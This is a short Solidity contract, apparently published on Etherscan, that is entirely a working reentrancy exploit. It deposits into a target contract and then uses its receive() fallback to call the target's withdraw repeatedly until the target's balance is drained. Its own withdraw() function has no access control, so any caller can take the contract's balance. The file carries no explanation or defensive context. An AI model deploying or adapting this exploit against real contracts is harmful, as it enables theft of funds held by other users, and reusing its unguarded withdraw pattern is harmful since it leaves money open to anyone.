/**
 *Submitted for verification at Etherscan.io on 2022-11-30
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Reentrancy {
    address payable victim;
    uint256 targetAmount = 0.001 ether;

    constructor(address payable _victim) {
        victim = _victim;
    }

    function donate() public payable {
        require(msg.value == targetAmount, "Please donate 0.001 ETH");
        bytes memory payload = abi.encodeWithSignature("donate(address)", address(this));
        (bool success, ) = victim.call{value: targetAmount}(payload);
        require(success, "Transaction call using encodeWithSignature is successful");
    }

    function exploitWithdraw() public {
        bytes memory payload = abi.encodeWithSignature("withdraw(uint256)", targetAmount);
        (bool success, ) = victim.call(payload);
        require(success, "Exploited withdraw is successful");        
    }

    receive() external payable {
        uint256 balance = victim.balance;
        if (balance >= targetAmount) {
            exploitWithdraw();
        }
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}